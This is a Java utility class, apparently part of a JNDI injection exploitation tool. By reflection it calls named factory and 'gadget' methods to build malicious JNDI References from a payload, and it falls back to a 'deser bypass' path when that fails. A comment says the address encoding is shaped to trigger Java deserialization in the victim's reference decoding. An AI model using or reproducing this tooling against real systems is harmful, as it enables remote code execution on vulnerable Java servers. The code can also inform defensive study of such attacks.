package sonomon.jndi.factory;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import javax.naming.RefAddr;
import javax.naming.Reference;
import com.unboundid.util.Base64;


public class FactoryUtils {
	private final static String factorPackageName = "sonomon.jndi.factory.";
	
	
	public static byte[] objectToBytes(Object o){
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream os = null;
		try {
			os = new ObjectOutputStream(out);
		} catch (IOException e) {
			e.printStackTrace();
		}
        try {
			os.writeObject(o);
		} catch (IOException e) {
			e.printStackTrace();
		}
		return out.toByteArray();
	}
	
    public static String bytesToHex(byte[] bArray) {
    	int length = bArray.length;
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
	
	public static Reference invoke(String factory, String gadget, String payload){
		Class<?> factoryclass = null;
		Object factoryobj = null;
		Method gadgetmethod = null;
		boolean deserflag = false;
		Exception e = null;
		try {
			factoryclass = Class.forName(factorPackageName+factory);
			factoryobj = factoryclass.newInstance();
			try {
				gadgetmethod = factoryclass.getMethod(gadget, String.class);
				try {
					Reference ref = (Reference) gadgetmethod.invoke(factoryobj, payload);
					return ref;
				} catch (Exception e3) {
					System.out.println("[-] payload:"+payload+" invoke error");
					deserflag = true;
					e = e3;
				}
			} catch (Exception e2) {
				System.out.println("[-] gadget:"+gadget+" getMethod error");
				deserflag = true;
				e = e2;
			}
		} catch (Exception e1) {
			System.out.println("[-] factory:"+factory+" newInstance error");
			deserflag = true;
			e = e1;
		}
		
		if (deserflag) {
			System.out.println("[+] try deser bypass");
			return deserinvoke(factory, gadget, payload, e);
		}
		return null;
	}
	
	
	public static Reference deserinvoke(String factory, String gadget, String payload, Exception e){
		try {
			Class<?> factoryclass = Class.forName(factorPackageName+factory);
			Object factoryobj = factoryclass.newInstance();
			Method gadgetmethod = factoryclass.getMethod("deserbypass", String.class, String.class);
			return (Reference) gadgetmethod.invoke(factoryobj, gadget, payload);
		} catch (Exception e4) {
			System.out.println("[-] "+factory+" deserbypass error: "+payload);
//			e.printStackTrace();
//			e4.printStackTrace();
		}
		return null;
	}
	
	
	public static String[] getJavaReferenceAddress(Reference ref){
		Enumeration<RefAddr> enumeration = ref.getAll();
		ArrayList<String> arrayList = new ArrayList<String>();
		int num = 0;
		String all = null;
		String content = null;
		while (enumeration.hasMoreElements()) {
			RefAddr refAddr = (RefAddr) enumeration.nextElement();
			
			try {
				content = (String) refAddr.getContent();
			}catch (Exception e) {
				content = Base64.encode((byte[])refAddr.getContent());
			}
			
			String type = refAddr.getType();
			//为了触发Obj.decodeReference(Attributes, String[])中deserializeObject
			if(type.equals("readObject")) {
				all = "/"+num+"/"+type+"//"+content;
			} else {
				all = "/"+num+"/"+type+"/"+content;
			}
			arrayList.add(all);
			num += 1;
		}
		String[] javaReferenceAddress = arrayList.toArray(new String[0]);
		return javaReferenceAddress;
	}
	

}
